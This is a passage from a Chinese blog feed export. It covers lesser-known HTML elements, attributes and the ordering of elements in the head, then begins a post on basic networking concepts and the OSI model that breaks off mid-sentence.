class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;q&quot;</span> <span class="attr">autofocus</span> /&gt;</span></span><br></pre></td></tr></table></figure><h3 id="and"><a href="#and" class="headerlink" title="&lt;details&gt; and &lt;summary&gt;"></a><code>&lt;details&gt; and &lt;summary&gt;</code></h3><p>详细信息展开元素，很有用，二者搭配使用，灵活性远超下拉列表元素。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 默认展开 &lt;details open&gt; --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;summary&gt; 设置 list-style: none; 可以隐藏黑三角标志 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">summary</span>&gt;</span>Details<span class="tag">&lt;/<span class="name">summary</span>&gt;</span></span><br><span class="line">  Something small enough to escape casual notice.</span><br><span class="line"><span class="tag">&lt;/<span class="name">details</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但没有内置的方法和属性可以添加状态转换时的动画效果。</p><h3 id="and-1"><a href="#and-1" class="headerlink" title="&lt;fieldset&gt; and &lt;legend&gt;"></a><code>&lt;fieldset&gt; and &lt;legend&gt;</code></h3><p>用于对表单中的控制元素进行分组（也包括 label 元素）。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">fieldset</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">legend</span>&gt;</span>Choose your favorite monster<span class="tag">&lt;/<span class="name">legend</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">id</span>=<span class="string">&quot;kraken&quot;</span> <span class="attr">name</span>=<span class="string">&quot;monster&quot;</span> <span class="attr">value</span>=<span class="string">&quot;K&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;kraken&quot;</span>&gt;</span>Kraken<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">id</span>=<span class="string">&quot;sasquatch&quot;</span> <span class="attr">name</span>=<span class="string">&quot;monster&quot;</span> <span class="attr">value</span>=<span class="string">&quot;S&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;sasquatch&quot;</span>&gt;</span>Sasquatch<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">id</span>=<span class="string">&quot;mothman&quot;</span> <span class="attr">name</span>=<span class="string">&quot;monster&quot;</span> <span class="attr">value</span>=<span class="string">&quot;M&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;mothman&quot;</span>&gt;</span>Mothman<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">fieldset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>死去的 tkinter 记忆开始攻击阿菇……</p><p>可以设置 <code>disabled</code> 属性，这会使得其子组件无法使用，提交表单时也不会携带对应数据。</p><h3 id="-10"><a href="#-10" class="headerlink" title="&lt;hgroup&gt;"></a><code>&lt;hgroup&gt;</code></h3><p>代表文档标题和与标题相关联的内容，它将一个 <code>&lt;h1&gt;</code>–<code>&lt;h6&gt;</code> 元素与一个或多个 <code>&lt;p&gt;</code> 元素组合在一起。实现主标题副标题会很方便。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">hgroup</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Frankenstein<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>Or: The Modern Prometheus<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">hgroup</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="-11"><a href="#-11" class="headerlink" title="&lt;kbd&gt;"></a><code>&lt;kbd&gt;</code></h3><p>HTML 键盘输入元素用于表示用户输入，它将产生一个行内元素，以浏览器的默认 <code>monospace</code> 字体显示。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Save the document by pressing <span class="tag">&lt;<span class="name">kbd</span>&gt;</span>Ctrl<span class="tag">&lt;/<span class="name">kbd</span>&gt;</span> + <span class="tag">&lt;<span class="name">kbd</span>&gt;</span>S<span class="tag">&lt;/<span class="name">kbd</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="-12"><a href="#-12" class="headerlink" title="&lt;meter&gt;"></a><code>&lt;meter&gt;</code></h3><p>用来显示已知范围的标量值或者分数值。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;fuel&quot;</span>&gt;</span>Fuel level:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meter</span> <span class="attr">id</span>=<span class="string">&quot;fuel&quot;</span> <span class="attr">min</span>=<span class="string">&quot;0&quot;</span> <span class="attr">max</span>=<span class="string">&quot;100&quot;</span> <span class="attr">low</span>=<span class="string">&quot;33&quot;</span> <span class="attr">high</span>=<span class="string">&quot;66&quot;</span> <span class="attr">optimum</span>=<span class="string">&quot;80&quot;</span> <span class="attr">value</span>=<span class="string">&quot;50&quot;</span>&gt;</span>at 50/100<span class="tag">&lt;/<span class="name">meter</span>&gt;</span></span><br></pre></td></tr></table></figure><p>自带了很多属性：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/meter#%E5%B1%9E%E6%80%A7">here</a></p><h3 id="-13"><a href="#-13" class="headerlink" title="&lt;noscript&gt;"></a><code>&lt;noscript&gt;</code></h3><p>如果页面上的脚本类型不受支持或者当前在浏览器中关闭了脚本，则在该元素中定义脚本未被执行时的替代内容。<code>XSS</code> 有时候会利用这个元素。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">noscript</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- anchor linking to external file --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.mozilla.com/&quot;</span>&gt;</span>External Link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Rocks!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="and-2"><a href="#and-2" class="headerlink" title="&lt;picture&gt; and &lt;source&gt;"></a><code>&lt;picture&gt; and &lt;source&gt;</code></h3><p>通过包含零或多个 <code>&lt;source&gt;</code> 元素和一个 <code>&lt;img&gt;</code> 元素来为不同的显示&#x2F;设备场景提供图像版本。浏览器会选择最匹配的子 <code>&lt;source&gt;</code> 元素，如果没有匹配的，就选择 <code>&lt;img&gt;</code> 元素的 <code>src</code> 属性中的 URL。然后，所选图像呈现在 <code>&lt;img&gt;</code> 元素占据的空间中。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--Change the browser window width to see the image change.--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">picture</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">srcset</span>=<span class="string">&quot;/media/cc0-images/surfer-240-200.jpg&quot;</span> <span class="attr">media</span>=<span class="string">&quot;(orientation: portrait)&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/media/cc0-images/painted-hand-298-332.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">picture</span>&gt;</span></span><br></pre></td></tr></table></figure><p>自带了一些属性：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/picture#%E5%B1%9E%E6%80%A7">here</a></p><h3 id="-14"><a href="#-14" class="headerlink" title="&lt;progress&gt;"></a><code>&lt;progress&gt;</code></h3><p>进度指示元素，用来做进度条。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>File progress:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">progress</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> <span class="attr">max</span>=<span class="string">&quot;100&quot;</span> <span class="attr">value</span>=<span class="string">&quot;70&quot;</span>&gt;</span>70%<span class="tag">&lt;/<span class="name">progress</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="HTML属性"><a href="#HTML属性" class="headerlink" title="HTML属性"></a>HTML属性</h2><h3 id="accesskey"><a href="#accesskey" class="headerlink" title="accesskey"></a><code>accesskey</code></h3><p>为当前元素提供一个快捷键，属性值为一个可打印字符。</p><p>但这个属性问题比较多：与系统快捷键冲突、指意不明、意外激活……能不用还是别用，但还是要知道一下。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">  If you need to relax, press the <span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">u</span>&gt;</span>S<span class="tag">&lt;/<span class="name">u</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span>tress reliever!</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">accesskey</span>=<span class="string">&quot;s&quot;</span>&gt;</span>Stress reliever<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="autocomplete"><a href="#autocomplete" class="headerlink" title="autocomplete"></a><code>autocomplete</code></h3><p>允许 web 开发人员指定用户代理是否有权限在填写表单字段值时提供自动帮助，并指导浏览器填写该字段的预期信息类型。</p><p>可选的属性值比较多，参考：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Attributes/autocomplete">autocomplete</a>.<br>我常用的是 <code>off</code>, 即禁止用户代理提供历史可选值（因为我觉得这很影响页面美观性）。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;firstName&quot;</span>&gt;</span>First Name:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;firstName&quot;</span> <span class="attr">id</span>=<span class="string">&quot;firstName&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;given-name&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;lastName&quot;</span>&gt;</span>Last Name:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;lastName&quot;</span> <span class="attr">id</span>=<span class="string">&quot;lastName&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;family-name&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;email&quot;</span>&gt;</span>Email:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">id</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;off&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h3 id="autofocus"><a href="#autofocus" class="headerlink" title="autofocus"></a><code>autofocus</code></h3><p>上文中提到过，可以在页面加载时使当前元素自动获得用户焦点。</p><h3 id="contenteditable"><a href="#contenteditable" class="headerlink" title="contenteditable"></a><code>contenteditable</code></h3><p>枚举属性，表示元素是否可被用户编辑，属性值为 <code>true</code> 或者 <code>false</code>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">blockquote</span> <span class="attr">contenteditable</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>Edit this content to add your own quote<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">blockquote</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="inert"><a href="#inert" class="headerlink" title="inert"></a><code>inert</code></h3><p>一个有趣的布尔属性，可以使本身及其所有子元素的用户交互事件被浏览器忽略，包括鼠标、键盘、焦点等事件。可以适当精简代码，增强可读性。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">inert</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://example.com&quot;</span>&gt;</span>Click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="spellcheck"><a href="#spellcheck" class="headerlink" title="spellcheck"></a><code>spellcheck</code></h3><p>枚举属性，表示元素是否会对用户输入的值做拼写检查，属性值为 <code>true</code> 或 <code>false</code>.</p><h3 id="translate"><a href="#translate" class="headerlink" title="translate"></a><code>translate</code></h3><p>枚举属性。规定制定元素是否需要翻译，属性值为 <code>yes</code> 或 <code>no</code>.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">footer</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">small</span>&gt;</span>© 2020 <span class="tag">&lt;<span class="name">span</span> <span class="attr">translate</span>=<span class="string">&quot;no&quot;</span>&gt;</span>BrandName<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">small</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="元素顺序"><a href="#元素顺序" class="headerlink" title="&lt;head&gt;元素顺序"></a><code>&lt;head&gt;</code>元素顺序</h2><p>编写 HTML 的 <code>&lt;head&gt;</code> 元素时，元素建议遵循以下顺序，可以提高网页性能：</p><ol><li>preconnect</li><li>script-async</li><li>css-contains-@ import</li><li>sync-js</li><li>sync-css</li><li>preload</li><li>script-defer</li><li>prefetch &#x2F; prerender</li><li>seo-relative</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- preconnect --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;preconnect&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://cdn.example.com&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- script-async --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">async</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.example.com/js/analytics.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- css-contains-@ import --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="keyword">@import</span> url(<span class="string">&#x27;https://fonts.googleapis.com/css2?family=Roboto&amp;display=swap&#x27;</span>);</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- sync-js --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/main.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- sync-css --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;css/styles.css&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- preload --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;preload&quot;</span> <span class="attr">href</span>=<span class="string">&quot;img/background.jpg&quot;</span> <span class="attr">as</span>=<span class="string">&quot;image&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- script-defer --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">defer</span> <span class="attr">src</span>=<span class="string">&quot;js/interactive.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- prefetch / prerender --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;prefetch&quot;</span> <span class="attr">href</span>=<span class="string">&quot;about.html&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;prerender&quot;</span> <span class="attr">href</span>=<span class="string">&quot;contact.html&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- seo-relative --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;canonical&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/index.html&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Other SEO related tags --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>我的网站<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;description&quot;</span> <span class="attr">content</span>=<span class="string">&quot;这是我的网站的描述。&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- 页面内容 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以使用 <code>capo.js</code> 工具，对 <code>&lt;head&gt;</code> 中的元素进行标注，快速识别和优化性能问题。GitHub 仓库地址：<a href="https://github.com/rviscomi/capo.js">capo.js</a>.</p><p>同时，官方还提供了对应的浏览器插件：<a href="https://chrome.google.com/webstore/detail/capo-get-your-%EF%B9%A4%F0%9D%9A%91%F0%9D%9A%8E%F0%9D%9A%8A%F0%9D%9A%8D%EF%B9%A5/ohabpnaccigjhkkebjofhpmebofgpbeb?utm_source=ext_sidebar&hl=zh-CN">Capo: get your ﹤𝚑𝚎𝚊𝚍﹥ in order</a>,<br>这个插件可以直观地展示当前 Web 页面 <code>&lt;head&gt;</code> 中各元素加载用时的真实顺序以及排序后的顺序。</p><p><img src="https://agu-img.oss-cn-hangzhou.aliyuncs.com/blog/20231006101948.png" alt="插件使用演示"></p><h2 id="叨叨叨"><a href="#叨叨叨" class="headerlink" title="叨叨叨"></a>叨叨叨</h2><p>HTML 译为 <em>超文本标记语言</em>，与 Markdown 更相似而非 Golang 等编程语言。它的作用是定义网页内容的含义和结构。相比 CSS 和 JavaScript，我对 HTML 的重视程度一直不够，现在看来可以改变一下思想，HTML 其实才是一个网页的基石。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML">HTML - MDN</a></li><li><a href="https://weibo.com/1812166904/NbGRFCRtU">新浪微博 - Barret李靖</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frontend </tag>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>速通计算机网络相关概念</title>
      <link href="/2023/10/15/2023/base-network/"/>
      <url>/2023/10/15/2023/base-network/</url>
      
        <content type="html"><![CDATA[<h2 id="常见概念"><a href="#常见概念" class="headerlink" title="常见概念"></a>常见概念</h2><p>网络由 <em>节点</em>、<em>节点之间的链路</em> 和 <em>管理节点间数据传输的协议</em> 组成。</p><h3 id="节点-node"><a href="#节点-node" class="headerlink" title="节点 node"></a><em>节点 node</em></h3><p>节点指连接到网络的物理电子设备，比如电脑、打印机、路由器等，在网络上进行信息的收发，彼此连级。通常，路由器将网络连接到因特网，交换机运行在网络内部，促进内网通信。</p><h3 id="链路-link"><a href="#链路-link" class="headerlink" title="链路 link"></a><em>链路 link</em></h3><p>链路连接网络中的节点，可以是有线的（比如以太网），也可以是无线的（比如 WiFi），可以是一对一的（A-B），也可以是一对多的(A-B且A-C)。</p><h3 id="协议-protocol"><a href="#协议-protocol" class="headerlink" title="协议 protocol"></a><em>协议 protocol</em></h3><p>协议是一组互相商定的规则，规定了数据应该按照什么形式进行转换，以允许网络中的两个节点交换数据。</p><p>协议定义了管理通信过程中语法（可通信的内容）、语义（如何通信）以及同步（何时通信以及通信的速度）的规则。协议可以由硬件、软件或二者的组合实现。协议可以由任何人创建，但是最被广泛采纳的协议都是基于标准的。   </p><h3 id="拓扑-topology"><a href="#拓扑-topology" class="headerlink" title="拓扑 topology"></a><em>拓扑 topology</em></h3><p>拓扑（topology）描述的是节点和链路如何在网络配置中组合在一起，通常用图描述。</p><h3 id="双工-duplex"><a href="#双工-duplex" class="headerlink" title="双工 duplex"></a><em>双工 duplex</em></h3><p>大家都知道“双向”传输，及 A、B 之间的数据可以互相传递，但这不意味着两个过程可以同时进行。<br>“双工”是对双向的一个更具体的描述，进一步区分了双向传输的方式。主要分为以下两类：</p><ul><li>半双工：允许在两个方向上进行传输，但不能同时进行</li><li>全双工：允许同时在两个方向上进行数据传输</li></ul><h2 id="网络层次划分"><a href="#网络层次划分" class="headerlink" title="网络层次划分"></a>网络层次划分</h2><p>国际标准化组织（ISO）在1978年提出了”开放系统互联参考模型”，即著名的 <em>OSI&#x2F;RM模型</em>（Open System Interconnection&#x2F;Reference Model）。<br>它将计算机网络体系结构的通信协议划分为七层，目的是为了使不同计算机厂家生产的计算机能够相互通信，以便在更大的范围内建立计算机网络</p><p>下面这张图可以简明地表示常见的三种网络层次划分之间的关系：</p><p><img src="https://agu-img.oss-cn-hangzhou.aliyuncs.com/blog/20231005143909.png" alt="三种网络层次划分"></p><h2 id="OSI七层模型"><a href="#OSI七层模型" class="headerlink" title="OSI七层模型"></a>OSI七层模型</h2><p>全称 <code>Opne System Interconnection</code>，及开放式系统互联参考模型，是国际标准化组织（ISO）提出的一个试图使各种计算机在世界范围内互联为网络的标准框架。</p><p>OSI 是一种理论下的模型，引入了服务、接口、协议、分层的概念，这为 TCP&#x2F;IP 协议的建立提供了参考。</p><p>自上而下分为以下七层，简单说说每一层的功能：</p><ol><li>应用层 <em>Application</em> 🟦<br> 为应用程序提供网络服务。它是计算机用户、以及各种应用程序和网络之间的接口，其功能是直接向用户提供服务，完成用户希望在网络上完成的各种工作。<br> 协议：<em>HTTP、TFTP、FTP、NFS、WAIS、SMTP……</em></li><li>表示层 <em>Presentation</em> 🟦<br> 数据编码、转换、加密解密。它负责将应用处理的信息格式与适合网络传输的格式互相转换，同时消除不同设备之间固有数据格式的差异。<br> 协议：<em>Telent、Rlogin、SNMP、Gopher……</em></li><li>会话层 <em>Session</em> 🟦<br> 创建、维护、管理会话连接。它负责建立和管理应用程序之间的通信。<br> 协议：<em>SMTP、DNS……</em></li><li>传输层 <em>Transport</em> 🟩<br> 数据通信。它负责创建、维护、管理段到端的连接，监控数据传输服务的质量，保证报文的正确传输。<br> 协议：<em>TCP、UDP……</em></li><li>网络层 <em>Network</em> 🟩<br> IP 寻址和路由选择。通过路由选择算法，为报文或通信自王选择最适当的路径。<br> 协议：<em>IP、ICMP、ARP、RARP、AKP、UUCP……</em></li><li>数据链路层 <em>Data Link</em> 🟨<br> 控制网络层与物理层之间的通信。它负责接受来自物理层的位流式数据，将其封装成帧，传输到网络层；或者将来自网络层的数据帧，拆装为位流式数据转发到物理层。<br> 协议：<em>FFDI、PDN、Arpanet……</em></li><li>物理层 <em>Physical</em> 🟥<br> 比特流数据传输。<br> 协议：<em>IEEE 802.1A、IEEE 802.2……</em></li></ol><p>以上七层，每一层都实现各自的功能和协议，并与相邻层的接口通信。</p><h2 id="IP-地址"><a href="#IP-地址" class="headerlink" title="IP 地址"></a>IP 地址</h2><p><em>IP地址</em>（Internet Protocol Address）是指互联网协议地址，又译为网际协议地址，是 IP 协议提供的一种统一的地址格式，它为互联网上的每一个网络和每一台主机分配一个逻辑地址，以此来屏蔽物理地址的差异。</p><p>每个 IP 地址包括两部分：</p><ul><li><em>网络号</em><br>用于在互联网中定位用户的网络，同一个物理网络上的所有主机都使用同一个网络号。对于网络号相同的设备，无论实际所处的物理位置如何，它们都处在同意网络中。</li><li><em>主机号</em><br>用于标识具体设备，网络中每一个主机号都对应一个主机（包括服务器、路由器等），同一网络上的设备都具有唯一的 IP 地址，只有 IP 地址唯一才能正常通信。</li></ul><p>为什么要使用 IP 地址？<br>单个局域网网段中，我们可以使用 MAC 地址进行通信。但在路由式网络中，计算机之间不能使用 